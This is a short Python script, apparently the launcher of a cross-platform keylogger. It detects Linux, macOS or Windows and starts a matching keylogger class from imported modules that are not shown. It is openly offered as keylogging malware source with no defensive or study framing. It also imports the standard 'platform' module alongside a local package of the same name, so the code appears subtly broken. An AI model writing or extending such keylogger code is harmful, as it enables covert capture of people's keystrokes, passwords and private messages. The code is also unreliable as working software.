import platform
from platform.linux_keylogger import LinuxKeylogger
from platform.mac_keylogger import MacKeylogger
from platform.windows_keylogger import WindowsKeylogger

def start_keylogger():
    os_name = platform.system()
    if os_name == "Linux":
        keylogger = LinuxKeylogger()
    elif os_name == "Darwin":
        keylogger = MacKeylogger()
    elif os_name == "Windows":
        keylogger = WindowsKeylogger()
    else:
        raise RuntimeError(f"Unsupported OS: {os_name}")
    
    print(f"Starting keylogger on {os_name}...")
    keylogger.start_logging()

if __name__ == "__main__":
    start_keylogger()
